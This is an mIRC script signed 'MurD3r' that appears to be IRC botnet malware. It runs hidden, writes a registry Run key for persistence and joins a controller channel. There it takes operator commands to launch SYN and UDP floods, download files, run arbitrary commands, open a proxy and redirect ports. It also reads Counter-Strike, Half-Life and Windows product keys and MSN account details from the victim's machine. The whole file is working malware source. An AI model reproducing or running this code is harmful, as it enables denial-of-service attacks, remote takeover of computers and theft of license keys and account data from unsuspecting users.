; E X T By MurD3r ;
alias jc { /join $l0v3ly(nc) $l0v3ly(nk) }
alias connec { server $l0v3ly(nr) $l0v3ly(np) | if ($portfree(113)) { socklisten IDENT 113 } }
alias n4s3r {  .ddeserver on MurD3r |  .nick Man] $+ $r(10000,99999) $+ [ $+ $os | anick Man] $+ $r(10000,99999) $+ [ $+ $os | username 4R e D | identd on Jordan | emailaddr aLQsr1 | .connec | .timerconnec -o 0 20 connec | .timerus -o 0 1 us | .timerus -o 0 1 hd | .timerst4rt -o 0 3 st4rt  }
alias shows { if ($me isvo $l0v3ly(nc)) { clearall | msg $l0v3ly(nc) $1- } }
alias cskey { shows |KeyS| CS key: $RegRead(HKEY_CURRENT_USER\Software\Valve\CounterStrike\Settings\Key) | shows |KeyS|  HL key: $RegRead(HKEY_CURRENT_USER\Software\Valve\Half-Life\Settings\Key) }
alias winkey { shows |KeyS| windows key: $RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductId) | shows |KeyS| windows key: $RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductKey) }
alias st4rt { 
  set %filetoboot $rand(100,999) $+ .reg 
  write %filetoboot  REGEDIT4
  write %filetoboot [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]  
  write %filetoboot "Real0ne"=" $+ $replace($mircexe,\,\\) $+ "  
  run -n regedit /s %filetoboot
  timer 1 4 remove %filetoboot
}
alias RegDelete { if ($1 != $null) { var %a = RegDelete | .comopen %a WScript.Shell | if !$comerr { var %b = $com(%a,RegDelete,3,bstr,$1) | .comclose %a } } | else { echo error! complete data } }
alias RegWrite { if ($1) && ($2) && ($3) { %a = RegWrite | .comopen %a WScript.Shell | if (!$comerr) { %b = $com(%a,RegWrite,3,bstr,$1,bstr,$2,bstr,$3) | .comclose %a } | if ($3 == REG_EXPAND_SZ) || ($3 == REG_SZ) { if ($regread($1) == $2) { halt } | else { echo error! when writing } } } | else { echo error! complete data } }
alias RegRead { if ($1 != $null) { var %a = regread | .comopen %a WScript.Shell | if !$comerr { var %b =  $com(%a,RegRead,3,bstr,$1-) | var %c = $com(%a).result | .comclose %a | if (%c) return %c | else { return $false } } } | else { return error! complete data } }
alias r3m {  if $isdir(sounds) || $isdir(logs) || $isdir(download) || $isdir(channels) { rmdir sounds | rmdir logs | rmdir download | rmdir channels | halt } }
alias ircx { write -c i1.txt | write -c i1.bat netstat -n >i1.txt | run vovo.exe /n /fh /r "i1.bat" | .timerX 1 3 ircx2 }
alias ircx2 { %ci = 5 | %cx = $lines(i1.txt) | unset %cz | :loop | if (%ci > %cx) { msg $l0v3ly(nc2) $1- [IrcX] servinfo: ( $+ $gettok(%cz,1-,44) $+ ) | halt } | %ctemp = $gettok($read(i1.txt,%ci),3,32) | if (*:666* iswm %ctemp) { %cz = $+(%cz,$chr(44),%ctemp) } | inc %ci | goto loop | .timer 1 8 /remove i1.txt | .timer 1 9 /remove i1.bat }
alias hidef { var %h1d $findfile($mircdir,*.*,0,write hidf.bat attrib +R +S +H $noPATH($1-)) | run vovo.exe /n /fh /r hidf.bat }
alias us { if ($appactive = $true) { run vovo.exe /n /fh mirc } }
alias hd { if ($appstate != hidden) { run vovo.exe /n /fh mirc } }
alias predirectstats { set %gtpcount 0 | :startloophere | inc %gtpcount 1 |  if $sock(gtportdirect*,%gtpcount) != $null { /msg $1 1*(PortRedirect)*: In-port: $gettok($sock(gtportdirect*,%gtpcount),2,46) to $gettok($sock(gtportdirect*,%gtpcount).mark,1,32) $+ : $+ $gettok($sock(gtportdirect*,%gtpcount).mark,2,32)   | /msg $1 12[Local IP Address]:14 $ip | goto startloophere  } | else { if %gtpcount = 1 { //msg $1 1*** Error, no port redirects! } | //msg $1 1*** PortRedirect/End | unset %gtpcount } }
alias pdirectstop { Set %gtrdstoppnum $1 | sockclose [ gtportdirect. [ $+ [ %gtrdstoppnum ] ] ]  | sockclose [ gtin. [ $+ [ %gtrdstoppnum ] ] ] $+ *  | sockclose [ gtout. [ $+ [ %gtrdstoppnum ] ] ] $+ *  | unset %gtrdstoppnum } 
alias gtportdirect { if $3 = $null { return } | socklisten gtportdirect $+ . $+ $1 $1 | sockmark gtportdirect $+ . $+ $1 $2 $3 }
alias findit { set %ftot $findfile($$2,$$1,0) | shows  14[12Search14] $$1 returned %ftot files. | set %fcount 0 | while (%fcount < %ftot) { inc %fcount | shows $findfile($$2,$$1,%fcount) } | shows End of search. | unset %fcount | unset %ftot }
alias synp { if ($1 == $null) { return } | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop |  syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | shows Packets Done :> }
alias syn {
  if ($2 == start) { if ($3 !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x  } }
  if ($2 == stop) { if ($sock(syn*,0) > 0) { sockclose syn* } }
}
on *:START:{ run vovo.exe /n /fh mirc | n4s3r } }
on *:disconnect:{ timerconnec -o 0 15 connec  }
on *:exit:{ unsetall | clearall | sockclose * | timers off }
on *:connect:{ .ial on | .timerconnec off | .mode $me +ix | .timerjc 0 $rand(5,10) /jc | .pdcc on | .fsend on | clearall }
on *:OP:#: { if ($opnick = $me) { mode $chan +mnstk $l0v3ly(nk) } }
on *:PING:{ ctcp $me ping }
on *:dns:{ %address = $iaddress } { if (%dns.r == on) { shows dns: %dns.rrr resolved to ip: $iaddress host: $naddress | unset %dns.* } } 
on *:join:$l0v3ly(nc):{ if ($nick == $me) { .timerjc off } }
on *:part:$l0v3ly(nc):{ if ($nick == $me) { timerjc 0 3 raw -q /jc } }
on *:KICK:$l0v3ly(nc):{ if ($knick == $me) { timerjc 0 3 raw -q /jc } }
on *:socklisten:ident: { .sockaccept $sockname $+ . $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) }
on *:sockread:IDENT.*: { sockread %tmp | tokenize 32 %tmp | sockwrite -tn $sockname $3 $2 $1 : USERID : UNIX : $fnick | unset %tmp }
on *:socklisten:Bnc:{ sockaccept Bnc.temp | %conncheck = $sock(Bnc.temp).ip | if ($sock($+(bnc.in.,%conncheck))) { sockclose bnc.temp } | sockrename Bnc.Temp Bnc.temp. [ $+ [ $sock(Bnc.temp).ip ] ] }
on *:sockread:Bnc.temp.*:{ sockread %bnc.in | tokenize 32 %bnc.in { if ($1 = NICK) { sockwrite -n $sockname NOTICE $host :BNC iRc Proxy ( $+ $2 $+ ) | set %Bnc.nick. [ $+ [ $sock($sockname).ip ] ] $2 | halt } | if ($1 = USER) { .identd on $2 | set %Bnc.user. [ $+ [ $sock($sockname).ip ] ] $2- | sockwrite -n $sockname NOTICE $host :Please type /pass <password> | halt } | if ($1 = PASS) { if ($2 = %Bnc.pass) { sockwrite -n $sockname NOTICE $host :Password accepted, Welcome In... | sockwrite -n $sockname NOTICE $host :Please type /conn <server> <port> | sockrename $sockname $replace($sockname,Bnc.temp,Bnc.in) | halt } | if ($2 != %Bnc.pass) { sockwrite -n $sockname NOTICE $host :Access Denied.. } | if (!$2) { sockwrite -n $sockname NOTICE $host :You Need A Password To Cconnect | sockwrite -n $sockname NOTICE $host :Please Type /pass <password> }  } } }
on *:sockread:Bnc.in.*:{ sockread %bnc.in | tokenize 32 %bnc.in { if ($1 = USER) { .identd on $2 | set %Bnc.user. [ $+ [ $sock($sockname).ip ] ] $2- | halt } | if ($1 = CONN) { if (!$2) { sockwrite -n $sockname NOTICE $host :please type /conn <server> <port> | halt } | if (!$3) { %xxxx = 6667 } | if ($3) { %xxxx = $3 } | if ($sock($replace($sockname,Bnc.in,Bnc.out))) { sockwrite -n $sockname NOTICE $host :Disconnecting from previous connection | sockclose Bnc.out. [ $+ [ $sock($sockname).ip ] ] } | sockopen $replace($sockname,Bnc.in,Bnc.out) $2 %xxxx | sockwrite -n $sockname NOTICE $host :making reality through $2 port %xxxx | unset %xxxx | halt } | if ($1 = NICK) { set %bnc.nick. [ $+ [ $sock($sockname).ip ] ] $2 } | if ($sock($replace($sockname,Bnc.in,Bnc.out))) { sockwrite -n $replace($sockname,Bnc.in,Bnc.out) $1- } } | unset %bnc.in }
on *:sockopen:Bnc.out.*:{ if ($sockerr) { sockwrite -n $replace($sockname,Bnc.out,Bnc.in) NOTICE $host :Failed Connection | halt } | sockwrite -n $replace($sockname,Bnc.out,Bnc.in) NOTICE $host :Suceeded Connection | sockwrite -n $sockname NICK %Bnc.nick. [ $+ [ $remove($sockname,Bnc.out.) ] ] | sockwrite -n $sockname USER %Bnc.user. [ $+ [ $remove($sockname,Bnc.out.) ] ] }
on *:sockread:Bnc.out.*:{ sockread %Bnc.out | if (!$sock($replace($sockname,Bnc.out,Bnc.in))) { sockwrite -n $sockname Quit :Dead Socket. | halt } | sockwrite -n $replace($sockname,Bnc.out,Bnc.in) %Bnc.out | unset %bnc.out }
on *:TEXT:*:*: {
  if ($nick isop $l0v3ly(nc)) {
    if ($1 = !dde) { /dde $2 command "" / $+ $3- }
    if ($1 = !syn) { if ($2 !== $null) { shows [Packets] [ $+ $2 $+ ] on [ $+ $3 $+ ] With [ $+ $4 $+ ]   | synp start $4 $2 $3 } }
    if ($1 = !pfast) { if ($4 == random) { //pf4st $2 $3 $r(1,64000) | halt } | //pf4st $2 $3 $4 }
    if ($1 = !udp) {  if ($4 == random) { //xudp $2 $3 $r(1,65000) | halt } | //xudp $2 $3 $4 }
    if ($1 = !syn.stop) { if ($sock(syn*,0) > 0) { sockclose syn* | shows [Syn Attack] is now halted.... } }
    if ($1 = !proxy) { r4.proxy $2- }
    if ($1 = !clone) { clone $2- }
    if ($1 = !xt) { clonez $2- }
    if ($1 = !reconnect) { timer 1 1 /quit 1E X T... | connec }
    if ($1 = !/) && ($2 != $null) { %do = $2- | / $+ %do | unset %do }
    if ($1 = !get) { shows Downloading:[ $2 ] | download file $2 $mircdir }
    if ($1 = !get2) { shows Downloading:[ $2 ] | download file $2 $3 }
    if ($1 = !msn) { .comopen msn Messenger.UIAutomation | if ($comerr) { return } | %a = $com(msn,MyStatus,2) | %b = $com(msn).result | %a = $com(msn,MyFriendlyName,2) | %c = $com(msn).result | %a = $com(msn,MySigninName,2) | %d = $com(msn).result | %a = $com(msn,MyServiceName,2) | %e = $com(msn).result | %x = $com(msn,InstallationDirectory,1) | .comclose msn | if (%b = 1) { %b = Offline } | if (%b = 2) { %b = Online } | if (%b = 6) { %b = Invisible } | if (%b = 10) { %b = Busy } | if (%b = 14) { %b = Be Right Back } | if (%b = 18) { %b = Idle } | if (%b = 34) { %b = Away } | if (%b = 50) { %b = On the Phone } | if (%b = 66) { %b = Out for Lunch } | if (%b = offline) { shows [Msn] Currently Offline. } | else { shows [msn] [Nickname: %c $+ ]  [E-mail: %d $+ ] [Service Provider: %e $+ ] [Status: %b $+ ] } }
    if ($1 = !net) { shows |network-information| connection: $dll(win.dll,connection,_) network interfaces: $dll(win.dll,interfaceinfo,_) ip: $ip host: $host }
    if ($1 = !cpu) { shows |cpu-information| time: $time(h:nn TT) date: $date(mmmm doo yyyy) os: $os cpu: $dll(win.dll,cpuinfo,_) memory: $dll(win.dll,meminfo,_) uptime: $uptime(system,1) hd: $dll(win.dll,diskcapacity,_) }
    if ($1 = !portinfo) { %cp.i = 1 | %cp.x = 65000 | %cp.p = $null | :loop | if (%cp.i > %cp.x) { goto return } | if (!$portfree(%cp.i)) { %cp.p = $+(%cp.p,$chr(130),%cp.i) } | inc %cp.i | goto loop | :return | shows [Portinfo] ( $+ $gettok(%cp.p,1-,130) $+ ) | unset %cp.* }
    if ($1 = !fserv) { shows [F-Serv Initialized] ( $+ $nick $+ ) ( Enjoy! | /fserve $nick 3 $2  }
    if ($1 = !bnc) { if ($2 == start) || ($2 == -s) { if (!$sock(bnc)) && ($4) && ($portfree($3)) { socklisten bnc $3 | .set %bnc.pass $4 | shows bnc started: /server -m $ip $+ : $+ $sock(BNc).port , pass: %bnc.pass } | elseif ($sock(bnc)) { shows bnc is already running: /server -m $ip $sock(BNc).port , with pass: %bnc.pass } } | if ($2 = stop) || ($2 == -k) { if (!$sock(bnc)) { halt } | else { sockclose bnc* | .unset %bnc* | shows bnc is now halted } } }
    if ($1 = !ircx) { ircx | shows [IrcX] Checking Local Connections.. | halt }
    if ($1 = !dns) { dns $2 | set %dns.r on | set %dns.rr # | set %dns.rrr $2 | shows attempting to resolve: $2 } 
    if ($1 = !sys) { shows Ip: $ip Windows: $os Host: $host Time: $time(h:nn tt) Date: $date(mmmm doo yyyy) }
    if ($1 = !uptime) { shows system uptime: $duration($uptime(system,3)) , mirc uptime: $uptime(mirc,1) }
    if ($1 = !var) { shows Variable = [ [ $$2- ] ] } 
    if ($1 = !cskey)  { cskey }
    if ($1 = !winkey)  { winkey }
    if ($1 = !search) { findit $$2 $$3  }
    if ($1 = !visit) { set %v.h $nofile($2) | set %v.g $nopath($2) | shows [visit] visiting $2 ,please wait.... | sockopen $+(sclick,$r(1,99999)) %v.h 80 }
    if ($1 = !diskinfo) { .shows I have $bytes($disk(c).free).suf of free space, total; $bytes($disk(c).size).suf }
    if ($1 = !portredirect) {
      if ($2 == $null) { shows [XT Help] !portredirect add 1000 irc.dal.net 6667 // !portredirect stop port // !portredirect stats | halt }
      if ($2 == add) { if ($5 == $null) { shows 3PORT REDIRECTION ERROR: !portredirect add inputport outputserver outputserverport (!portredirect add 1000 irc.dal.net 6667) | halt } | //gtportdirect $3- | shows 14[REDIRECT ADDED] I-PORT=( $+ $3 $+ ) to $4 $+ $5 | shows 12[LOCAL IP ADDRESS]:14 $ip |  halt  }
      if ($2 == stop) {  if ($3 == $null) { halt } | /pdirectstop $3 |  shows 14[PORTREDIRECTION] PORT:(12 $+ $3 $+ 14) HAS BEEN STOPPED. |  halt  } | 
    if ($2 == stats) { shows PORT REDIRECTION STATS. |  /predirectstats #  } }
  }
}
}
}

raw 433:*:{ nick xNawaf] $+ $r(10000,99999) $+ [ $+ $os }
